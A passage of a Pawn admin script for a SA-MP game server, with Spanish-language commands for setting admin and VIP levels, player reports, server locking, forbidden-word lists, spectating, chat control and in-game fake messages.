		if(PlayerInfo[i][Level] >= 1 && PlayerInfo[i][Hide] == 0)
		{
			new pname[MAX_PLAYER_NAME];
			GetPlayerName(i,pname, sizeof(pname));
			format(fstring, sizeof(fstring),"{FFFFFF}%s (%d)\n", PlayerName2(i),PlayerInfo[i][Level]);
			strcat(string, fstring, sizeof(string));
			conteo++;
		}
	}
	if(conteo >= 1)
	ShowPlayerDialog(playerid,2563,DIALOG_STYLE_LIST,"Administradores conectados:",string,"Aceptar","");
	if(conteo == 0)
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} No hay administradores conectados.");
	return 1;
}

CMD:vips(playerid,params[])
{
	#pragma unused params
	new string[500];
	new fstring[500];
	new conteo;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(PlayerInfo[i][Vip] >= 1)
		{
			new pname[MAX_PLAYER_NAME];
			GetPlayerName(i,pname, sizeof(pname));
			format(fstring, sizeof(fstring),"{FFFFFF}%s (%d)\n", PlayerName2(i),PlayerInfo[i][Vip]);
			strcat(string, fstring, sizeof(string));
			conteo++;
		}
	}
	if(conteo >= 1)
	ShowPlayerDialog(playerid,2563,DIALOG_STYLE_LIST,"Vips conectados:",string,"Aceptar","");
	if(conteo == 0)
	SendClientMessage(playerid,red,"|Info| »{EAEAEA} No hay vips conectados.");
	return 1;
}

CMD:setvip(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;        tmp = strtok(params,Index), tmp2 = strtok(params,Index);
            if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetVip [JugadorID] [Nivel]");
            new player1, vip, playername[MAX_PLAYER_NAME], vipname[MAX_PLAYER_NAME], string[140];
            player1 = strval(tmp);
            if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetVip [JugadorID] [Nivel]");
            vip = strval(tmp2);
			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][LoggedIn] == 1) {
                    if(vip > 3 ) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Nivel incorrecto [1-3].");
                    if(vip == PlayerInfo[player1][Vip]) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador ya tiene ese nivel.");
                    CMDMessageToAdmins(playerid,"/SetVip");
                    GetPlayerName(player1, playername, sizeof(playername));    GetPlayerName(playerid, vipname, sizeof(vipname));
                    new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
					if(vip > 0) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha subido/bajado el nivel de Vip. {FF0000}[Nivel %d]",vipname, vip);
                    else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha subido/bajado el nivel de Vip. {FF0000}[Nivel %d]",vipname, vip);
                    SendClientMessage(player1,red,string);
					if(vip > PlayerInfo[player1][Vip]) GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
                    else GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Bajaste de nivel", 2000, 3);
                    format(string,sizeof(string),"|Info| »{EAEAEA} Le has subido/bajado el nivel de Vip a {0080FF}%s. {FF0000}[Nivel %d]", playername, vip, day, month, year, hour, minute, second); SendClientMessage(playerid,red,string);
                    format(string,sizeof(string),"Administrator %s has made %s Level Vip %d on %d/%d/%d at %d:%d:%d",vipname, playername, vip, day, month, year, hour, minute, second);
					SaveToFile("Viplog",string);
                    dUserSetINT(PlayerName2(player1)).("vip",(vip));
                    PlayerInfo[player1][Vip] = vip;
                    return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:setlevel(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetLevel [JugadorID] [Nivel]");
	    	new player1, level, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[140];
			player1 = strval(tmp);
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetLevel [JugadorID] [Nivel]");
			level = strval(tmp2);
			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][LoggedIn] == 1) {
					if(level > ServerInfo[MaxAdminLevel] ) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Nivel incorrecto [1-10].");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador ya tiene ese nivel.");
	       			CMDMessageToAdmins(playerid,"/SetLevel");
					GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
					if(level > 0) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha subido/bajado el nivel de administracion. {FF0000}[Nivel %d]",adminname, level);
					else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha subido/bajado el nivel de administracion. {FF0000}[Nivel %d]",adminname, level);
					SendClientMessage(player1,red,string);
					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
					else GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Bajaste de nivel", 2000, 3);
					format(string,sizeof(string),"|Info| »{EAEAEA} Le has subido/bajado el nivel de administracion a {0080FF}%s. {FF0000}[Nivel %d]", playername, level); SendClientMessage(playerid,red,string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",adminname, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:settemplevel(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetTempLevel [JugadorID] [Nivel]");
	    	new player1, level, string[128];
			player1 = strval(tmp);
			level = strval(tmp2);
			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(PlayerInfo[player1][LoggedIn] == 1) {
					if(level > ServerInfo[MaxAdminLevel] ) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Nivel incorrecto [1-10].");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador ya tiene ese nivel.");
	       			CMDMessageToAdmins(playerid,"/SetTempLevel");
			       	new year,month,day; getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
					if(level > 0) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha subido/bajado el nivel de administracion. {FF0000}[Nivel %d]", pName(playerid), level);
					else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} subido/bajado el nivel de administracion. {FF0000}[Nivel %d]", pName(playerid), level);
					SendClientMessage(player1,red,string);
					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Subiste de nivel", 2000, 3);
					else GameTextForPlayer(player1,"~w~Felicidades!~n~~r~Bajaste de nivel", 2000, 3);
					format(string,sizeof(string),"|Info| »{EAEAEA} Le has subido/bajado el nivel de administracion a {0080FF}%s{EAEAEA}. {FF0000}[Nivel %d]", pName(player1), level); SendClientMessage(playerid,red,string);
					format(string,sizeof(string),"Administrator %s has made %s temp Level %d on %d/%d/%d at %d:%d:%d",pName(playerid), pName(player1), level, day, month, year, hour, minute, second);
					SaveToFile("TempAdminLog",string);
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:hide(playerid,params[])
{
    #pragma unused params
	if (PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid))
	{
	    if (PlayerInfo[playerid][Hide] == 1)
 		return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Ya te has escondido de las lista de admins.");
 		PlayerInfo[playerid][Hide] = 1;
 		CMDMessageToAdmins(playerid,"/Hide");
        return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Ahora no te veran en la lista de admins.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}
CMD:unhide(playerid,params[])
{
    #pragma unused params
	if (PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid))
	{
 		if (PlayerInfo[playerid][Hide] != 1)
 		return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No te has escondido de la lista de admins");
  		PlayerInfo[playerid][Hide] = 0;
  		CMDMessageToAdmins(playerid,"/UnHide");
   		return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Ahora si te veran en la lista de admins.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
}

CMD:report(playerid,params[]) {
    new reported, tmp[128], tmp2[128], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Report [JugadorID] [Razón]");
	reported = strval(tmp);

 	if(IsPlayerConnected(reported) && reported != INVALID_PLAYER_ID) {
		if(PlayerInfo[reported][Level] == ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes reportar a este administrador.");
		if(playerid == reported) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes reportarte tu mismo.");
		if(strlen(params) > 7) {
			new reportedname[MAX_PLAYER_NAME], reporter[MAX_PLAYER_NAME], str[128], hour,minute,second; gettime(hour,minute,second);
			GetPlayerName(reported, reportedname, sizeof(reportedname));	GetPlayerName(playerid, reporter, sizeof(reporter));
			format(str, sizeof(str), "[NewReport]: %s(%d) reporto a  %s(%d) Razón: %s |@%d:%d:%d|", reporter,playerid, reportedname, reported, params[strlen(tmp)+1], hour,minute,second);
			MessageToAdmins(COLOR_WHITE,str);
			SaveToFile("ReportLog",str);
			format(str, sizeof(str), "[NewReport]: %s(%d) reporto a  %s(%d) Razón: %s |@%d:%d:%d|", reporter,playerid, reportedname, reported, params[strlen(tmp)+1], hour,minute,second);
			for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			Reports[MAX_REPORTS-1] = str;
			return SendClientMessage(playerid,red, "|Info| »{EAEAEA} Tu reporte ha sido enviado a los administradores conectados.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Razón no valida.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
}
CMD:reports(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
        new ReportCount;
		for(new i = 1; i < MAX_REPORTS; i++)
		{
			if(strcmp( Reports[i], "<none>", true) != 0) { ReportCount++; SendClientMessage(playerid,COLOR_WHITE,Reports[i]); }
		}
		if(ReportCount == 0) SendClientMessage(playerid,red,"|Info| »{EAEAEA} No hay reportes.");
    } else SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{FFFFFF} para usar este comando.");
	return 1;
}

CMD:uconfig(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid))
	{
		UpdateConfig();
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return CMDMessageToAdmins(playerid,"/Uconfig");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}


CMD:lockserver(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Lockserver [Contraseña]");
    	new adminname[MAX_PLAYER_NAME], string[128];
		ServerInfo[Locked] = 1;
		strmid(ServerInfo[Password], params[0], 0, strlen(params[0]), 128);
		GetPlayerName(playerid, adminname, sizeof(adminname));
		format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha bloqueado el server.",adminname);
		SendClientMessageToAll(green,"________________________________________");
		SendClientMessageToAll(green," ");
		SendClientMessageToAll(red,string);
		SendClientMessageToAll(green,"________________________________________");
		for(new i = 0; i <= MAX_PLAYERS; i++) if(IsPlayerConnected(i)) { PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][AllowedIn] = true; }
		CMDMessageToAdmins(playerid,"/LockServer");
		format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le puso contraseña al servidor. {FF0000}[%s]",adminname, ServerInfo[Password] );
		return MessageToAdmins(red, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:unlockserver(playerid,params[]) {
    #pragma unused params
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
	if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    if(ServerInfo[Locked] == 1) {
	    	new adminname[MAX_PLAYER_NAME], string[128];
			ServerInfo[Locked] = 0;
			strmid(ServerInfo[Password], "", 0, strlen(""), 128);
			GetPlayerName(playerid, adminname, sizeof(adminname));
			format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha desbloqueado el server.",adminname);
  			SendClientMessageToAll(green,"________________________________________");
	  		SendClientMessageToAll(green," ");
			SendClientMessageToAll(red,string);
			SendClientMessageToAll(green,"________________________________________");
			for(new i = 0; i <= MAX_PLAYERS; i++) if(IsPlayerConnected(i)) { PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][AllowedIn] = true; }
			return CMDMessageToAdmins(playerid,"/UnLockServer");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El server no esta bloqueado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:password(playerid,params[]) {
	if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Password [Contraseña]");
	if(ServerInfo[Locked] == 1) {
	    if(PlayerInfo[playerid][AllowedIn] == false) {
			if(!strcmp(ServerInfo[Password],params[0],true)) {
				KillTimer( LockKickTimer[playerid] );
				PlayerInfo[playerid][AllowedIn] = true;
				new string[128];
				SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has puesto la contraseña correcta.");
				format(string, sizeof(string), "|Info| »{0080FF} %s {EAEAEA}ha puesto la contraseña correcta.",PlayerName2(playerid));
				return MessageToAdmins(red, string);
			} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Contraseña incorrecta.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Ya has puesto la contraseña.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El servidor no esta bloqueado.");
}

//------------------------------------------------------------------------------
CMD:forbidname(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /ForbidName [Nombre]");
		new File:BLfile, string[150];
		BLfile = fopen("ladmin/config/ForbiddenNames.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"/ForbidName");
		format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} añadio el nombre {0080FF}%s{EAEAEA} a la lista negra.", pName(playerid), params );
		return MessageToAdmins(red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:forbidword(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /ForbidWord [Palabra]");
		new File:BLfile, string[150];
		BLfile = fopen("ladmin/config/ForbiddenWords.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"/ForbidWord");
		format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} añadio la palabra {FF0000}%s{EAEAEA} a la lista negra.", pName(playerid), params );
		return MessageToAdmins(red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

//==========================[ Spectate Commands ]===============================
#if defined ENABLE_SPEC

CMD:lspec(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
	    if(isnull(params) || !IsNumeric(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Lspec [JugadorID]");
		new specplayerid = strval(params);
		if(PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(specplayerid) && specplayerid != INVALID_PLAYER_ID) {
			if(specplayerid == playerid) return SendClientMessage(playerid, red, "|Info| »{EAEAEA} Ya estas espiando a alguien.");
			if(GetPlayerState(specplayerid) == PLAYER_STATE_SPECTATING && PlayerInfo[specplayerid][SpecID] != INVALID_PLAYER_ID) return SendClientMessage(playerid, red, "Spectate: Player spectating someone else");
			if(GetPlayerState(specplayerid) != 1 && GetPlayerState(specplayerid) != 2 && GetPlayerState(specplayerid) != 3) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no ha spawneado.");
			if( (PlayerInfo[specplayerid][Level] != ServerInfo[MaxAdminLevel]) || (PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] == ServerInfo[MaxAdminLevel]) )	{
				StartSpectate(playerid, specplayerid);
				CMDMessageToAdmins(playerid,"/Lcpec");
				GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
				GetPlayerFacingAngle(playerid,Pos[playerid][3]);
				return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Ahora estas espiando.");
			} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes espiar a un admin de nivel alto.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:lspecoff(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
        if(PlayerInfo[playerid][SpecType] != ADMIN_SPEC_TYPE_NONE) {
			StopSpectate(playerid);
			SetTimerEx("PosAfterSpec",3000,0,"d",playerid);
			return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Ya no estas espiando.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No estas espiando a nadie.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

#endif

//==========================[ CHAT COMMANDS ]===================================

CMD:disablechat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/DisableChat");
		new string[128];
		if(ServerInfo[DisableChat] == 0) {
			ServerInfo[DisableChat] = 1;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha desactivado el chat.", pName(playerid) );
		} else {
			ServerInfo[DisableChat] = 0;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha activado el chat.", pName(playerid) );
		} return SendClientMessageToAll(red,string);
 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
}

CMD:clearchat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/ClearChat");
		for(new i = 0; i < 11; i++) SendClientMessageToAll(green," "); return 1;
 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
}

CMD:clearallchat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
		CMDMessageToAdmins(playerid,"/ClearAllChat");
		for(new i = 0; i < 50; i++) SendClientMessageToAll(green," "); return 1;
 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

//==================[ Object & Pickup ]=========================================
CMD:pickup(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Pickup [PickupID]");
	    new cpickup = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"/Pickup");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
		CreateDynamicPickup(cpickup, 2, x+2, y, z);
		format(string, sizeof(string), "CreateDynamicPickup(%d, 2, %0.2f, %0.2f, %0.2f);", cpickup, x+2, y, z);
       	SaveToFile("Pickups",string);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

CMD:object(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Object [ObjectID]");
	    new object = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"/Object");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
		CreateObject(object, x, y, z, 0.0, 0.0, a);
		format(string, sizeof(string), "CreateObject(%d, %0.2f, %0.2f, %0.2f, 0.00, 0.00, %0.2f);", object, x, y, z, a);
       	SaveToFile("Objects",string);
		format(string, sizeof(string), "You Have Created Object %d, at %0.2f, %0.2f, %0.2f Angle %0.2f", object, x, y, z, a);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

//===================[ Fake ]===================================================

#if defined ENABLE_FAKE_CMDS
CMD:fakedeath(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || isnull(tmp3)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Fakedeath [Asesino] [Asesinado] [ArmaID/Nombre del arma]");
		new killer = strval(tmp), killee = strval(tmp2), weap = strval(tmp3);
		if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID de arma no encontrada.");
		if(PlayerInfo[killer][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
		if(PlayerInfo[killee][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");

        if(IsPlayerConnected(killer) && killer != INVALID_PLAYER_ID) {
	        if(IsPlayerConnected(killee) && killee != INVALID_PLAYER_ID) {
	    	  	CMDMessageToAdmins(playerid,"/FakeDeath");
				SendDeathMessage(killer,killee,weap);
				return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Fake death message enviado.");
		    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El asesinado no esta conectado.");
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El asesino no esta conectado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:fakechat(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Fakechat [JugadorID] [Texto]");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"/FakeChat");
			SendPlayerMessageToAll(player1, params[strlen(tmp)+1]);
			return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Fake message enviado.");
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:fakecmd(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Fakecmd [JugadorID] [Comando]");
	    new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"/FakeCmd");
	        CallRemoteFunction("OnPlayerCommandPerformed", "is", player1, tmp2);
			return SendClientMessage(playerid,red,"|Info| »{EAEAEA} Fake cmd enviado.");
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:fakecmdall(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    new tmp2[256], Index; tmp2 = strtok(params,Index);
